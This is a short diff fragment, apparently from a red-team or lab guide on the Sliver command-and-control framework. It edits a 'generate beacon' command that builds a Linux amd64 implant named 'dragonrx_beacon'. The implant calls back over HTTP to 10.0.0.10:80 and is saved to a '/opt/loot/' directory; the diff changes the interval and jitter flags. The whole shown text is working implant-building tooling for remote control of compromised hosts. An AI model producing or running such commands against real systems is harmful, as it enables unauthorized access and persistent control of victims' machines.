@@ -443,8 +443,8 @@ sliver > generate beacon \
     --http 10.0.0.10:80 \
     --os linux --arch amd64 \
     --name dragonrx_beacon \
-    --beacon-interval 30s \
-    --beacon-jitter 5s \
+    --seconds 30 \
+    --jitter 5 \
     --save /opt/loot/ \
     --skip-symbols
 # [*] Build completed in Xs
